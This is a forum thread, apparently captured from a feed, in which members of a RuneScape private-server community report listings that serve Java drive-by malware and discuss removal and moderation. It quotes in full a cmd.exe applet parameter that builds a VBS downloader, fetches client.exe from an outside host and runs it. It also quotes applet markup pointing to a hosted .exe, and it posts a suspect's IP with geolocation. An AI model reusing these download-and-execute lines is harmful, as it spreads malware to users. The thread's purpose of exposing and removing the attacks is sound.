channel.title: OverloadX is a java driveby
channel.description:
Server link: http://www.moparisthebest.com/serverstatus.php?server=67.55.100.196 Report: http://www.threatexpert.com/report.aspx?md5=66da3a8c2017c9fc0da8f644261450ca Its a Java driveby when you click on "Click here to play!" please remove before any damage done.
if you view the code of the page, you will se it creates alot of VBS scripts & it downloads the file client.exe with a FUD java driveby
IF YOU HAVE BEEN INFECTED DELETE: C:\Users\YOURUSERNAME\AppData\Local\Temp\Payo.exe + C:\Windows\system32\system32\windowsupdaters.exe + + delete the registry keys: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\HKCU and HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run find the key that got the value C:\Windows\system32\system32\windowsupdaters.exe.
also delete c:\Users\USERNAME\AppData\Roaming\microsoft\Windows\start menu\Programs\Startup\license.dll and payo.exe
The fail: If you right click on the infected file and select Properties and head over to Details you will see the orginal file name: Crypted FUD ;).exe he used a fail VB.NET crypted for this RAT/Keylogger.
Another fail: [code]<param name='fst' value='cmd.exe /c echo Const NwGyQTQ = 1 > %TEMP%\hDfgD.vbs & echo Const Rc79zTQ = 2 >> %TEMP%\hDfgD.vbs & echo Dim LQEoN2V >> %TEMP%\hDfgD.vbs & echo Set LQEoN2V = CreateObject("ADODB.Stream") >> %TEMP%\hDfgD.vbs & echo LQEoN2V.Type = NwGyQTQ >> %TEMP%\hDfgD.vbs & echo LQEoN2V.Open >> %TEMP%\hDfgD.vbs & echo LQEoN2V.Write I4wDq7m(Wscript.Arguments(0)) >> %TEMP%\hDfgD.vbs & echo LQEoN2V.SaveToFile Wscript.Arguments(1), Rc79zTQ >> %TEMP%\hDfgD.vbs & echo Function I4wDq7m(Nuwduha) >> %TEMP%\hDfgD.vbs & echo Dim P0UoDPr >> %TEMP%\hDfgD.vbs & echo Set P0UoDPr = CreateObject("WinHttp.WinHttpRequest.5.1") >> %TEMP%\hDfgD.vbs & echo P0UoDPr.Open "GET", Nuwduha, False >> %TEMP%\hDfgD.vbs & echo P0UoDPr.Send >> %TEMP%\hDfgD.vbs & echo I4wDq7m = P0UoDPr.ResponseBody >> %TEMP%\hDfgD.vbs & echo End Function >> %TEMP%\hDfgD.vbs & echo Set BvrlkON = CreateObject("WScript.Shell") >> %TEMP%\hDfgD.vbs & echo BvrlkON.Run "%TEMP%\payo.exe" >> %TEMP%\hDfgD.vbs & start %TEMP%\hDfgD.vbs http://ethicgamers.com/webclient/client.exe?ex=Java_Driveby %TEMP%\payo.exe'> [/code] You can see at the end of the code(Gotten from the page) you will see: http://ethicgamers.com/webclient/client.exe?ex=Java_Driveby %TEMP%\payo.exe'> Fail...
Info about the failer: Orgianl IP address: 88.159.81.216 Its a rat: connect to the IP on port 82 IP address [?]: 88.159.81.216 [Whois] [Reverse IP] IP country code: NL IP address country: ip address flag Netherlands IP address state: Noord-Brabant IP address city: Eindhoven IP address latitude: 51.4500 IP address longitude: 5.4667 ISP of this IP [?]: Edutel BV Organization: Edutel Internet Host of this IP: [?]: 216-81-ftth.onsneteindhoven.nl [Whois] [Trace] Local time in Netherlands: 2011-03-12 17:50 just look at the ThreadExpert Report: http://www.threatexpert.com/report.aspx?md5=66da3a8c2017c9fc0da8f644261450ca

item.title: OverloadX is a java driveby
item.dc:creator: @abraham2119 abraham2119
item.description:
@abraham2119 wrote:

[quote=“Davidi2, post:60, topic:385950”][quote author=abraham2119 link=topic=481705.msg3529991#msg3529991 date=1300077369]
unless moparisthebest wants to continue to manually remove infected webclient entries from his site, he can write a program to run at a set cron job which traverses through the webclient entries, downloads them and scans them with this
[/quote]Except not all of the pages that need to be removed are just malicious java code[/quote]i havent looked at the server status page but does he allow linking to any page? if so, he could just run a simple static analysis on the html code to assert that it’s loading an applet…and then he can proceed to scan it with my tool

Read full topic

@drubrkletern wrote:

Davidi2:

Something like an approval system seems like a good idea. The status page is being used and abused (anyone else remember the ‘RuneScape 3’ phishing advertisements :rolleyes:)

This is also a good idea, has to be approved by a staff member.

item.title: OverloadX is a java driveby
item.dc:creator: @Tom Tom
item.description:
@Tom wrote:

[quote=“EMINEM BEAST™, post:54, topic:385950”][quote author=TOMSCAPE BETA link=topic=481705.msg3529451#msg3529451 date=1300052300]
Well, looks like I found more!

Server:

http://www.moparisthebest.com/serverstatus.php?server=frostiescape.no-ip.info

The webclient link leads to a blank page, but when you click around it takes you to.

http://www.cheatclient.com

Which then tries to load an applet, I scanned this with an online scanner and found a malicious Iframe and potentially other page exploits. The actual code is encrypted.

http://www.avgthreatlabs.com/sitereports/domain/?domain=cheatclient.com&check=

[hr]

I also found another of those servers which had multiple pages with all infected links, except this one doesn’t work.

http://www.moparisthebest.com/serverstatus.php?server=74.63.112.146

It’s a copy and paste of 3 other infected servers I reported. I think it’s best to remove it before they fix the link error.
[/quote]That http://cheatclient.com fucked my computer up :s[/quote]

URLs like those need censoring of the forums.

Read full topic

@drubrkletern wrote:

I think this is how it should be:

On the server’s status page (All servers) there should be a report button, were it would be sent to a new area on the forums, and the report would be sent in with proof, pictures, or anything from the user who reported, and a certified team picked by mitb can go into this new area delete the server or well just ignore the report.

item.title: OverloadX is a java driveby
item.dc:creator: @Tom Tom
item.description:
@Tom wrote:

[quote=“MrUbernub, post:47, topic:385950”][quote author=Moparisthebest link=topic=481705.msg3529394#msg3529394 date=1300049743]

@mitb: is there anyway you can it check the links it redirects you to, and check if it has any of h1.ripway or fileave in it?

No, because I’d have to make the HTTP requests and follow the redirects, but even if I did that, there would be nothing stopping people from just changing it later.

Also, this isn’t anything new with the release of free trade again, it’s been going on before that and it’ll continue, we just have to continue banning them.

@Tomscape, thanks much! I’ve went ahead and banned all of those servers/users from the server status page.

The plan I have to deal with these is what I’ve been trying to avoid for years, a manual verification system for each individual server. I need a team to do this though, and it’ll be hard, annoying work, but basically if the server can’t be played with MoparScape (4, which server owners can write their own client for), then it will be denied. This will ensure that each and every server is safe to play. (Because all custom code runs in a SecurityManager and can’t do anything malicious)
[/quote]

Can you just add a rule that no webclient/download without confirmation from a moderation[/quote]

I don’t think that’d be a wise move, it would increase a moderators work load substantially. They already have forum reports to deal with.

@Moparisthebest: No problem. It also sound like a good idea(s) to implement. Though you’d need quite an efficient team.

Read full topic

item.title: OverloadX is a java driveby
item.dc:creator: @MrUbernub MrUbernub
item.description:
@MrUbernub wrote:

[quote=“Moparisthebest, post:46, topic:385950”][quote author=ytuio9 link=topic=481705.msg3528989#msg3528989 date=1300027726]
@mitb: is there anyway you can it check the links it redirects you to, and check if it has any of h1.ripway or fileave in it?
[/quote]

No, because I’d have to make the HTTP requests and follow the redirects, but even if I did that, there would be nothing stopping people from just changing it later.

Also, this isn’t anything new with the release of free trade again, it’s been going on before that and it’ll continue, we just have to continue banning them.

@Tomscape, thanks much! I’ve went ahead and banned all of those servers/users from the server status page.

The plan I have to deal with these is what I’ve been trying to avoid for years, a manual verification system for each individual server. I need a team to do this though, and it’ll be hard, annoying work, but basically if the server can’t be played with MoparScape (4, which server owners can write their own client for), then it will be denied. This will ensure that each and every server is safe to play. (Because all custom code runs in a SecurityManager and can’t do anything malicious)[/quote]

Can you just add a rule that no webclient/download without confirmation from a moderation

Read full topic

item.title: OverloadX is a java driveby
item.dc:creator: @moparisthebest Moparisthebest
item.description:
@moparisthebest wrote:

ytuio9:

@mitb: is there anyway you can it check the links it redirects you to, and check if it has any of h1.ripway or fileave in it?

No, because I’d have to make the HTTP requests and follow the redirects, but even if I did that, there would be nothing stopping people from just changing it later.

Also, this isn’t anything new with the release of free trade again, it’s been going on before that and it’ll continue, we just have to continue banning them.

@Tomscape, thanks much! I’ve went ahead and banned all of those servers/users from the server status page.

The plan I have to deal with these is what I’ve been trying to avoid for years, a manual verification system for each individual server. I need a team to do this though, and it’ll be hard, annoying work, but basically if the server can’t be played with MoparScape (4, which server owners can write their own client for), then it will be denied. This will ensure that each and every server is safe to play. (Because all custom code runs in a SecurityManager and can’t do anything malicious)

Read full topic

item.description:
@Tom wrote:

Found another one:

http://www.moparisthebest.com/serverstatus.php?server=ownascape562.zapto.org

Java drive by. If I find more I’ll edit post.

[hr]

Found another other one:

http://www.moparisthebest.com/serverstatus.php?server=74.63.112.138

Java drive by. Code:

<title></title>
<meta http-equiv="PRAGMA" content="NO-CACHE">


<center>
<APPLET CODE = "Client.class" ARCHIVE = "Client.jar" WIDTH = "765" HEIGHT = "503">
    <PARAM NAME = "AMLMAFOIEA" VALUE = http://daveyboy101.fileave.com/test252.exe>
</APPLET>

Downloads:

http://daveyboy101.fileave.com/test252.exe - Again fileave/ripway are main sites for this.

In other news…

I think a mod should check this users IP

moparisthebest.com

moparisthebest.com

programming, irc, cars

A few servers are using the same images/host I think someone is all of those servers. This will determine it.
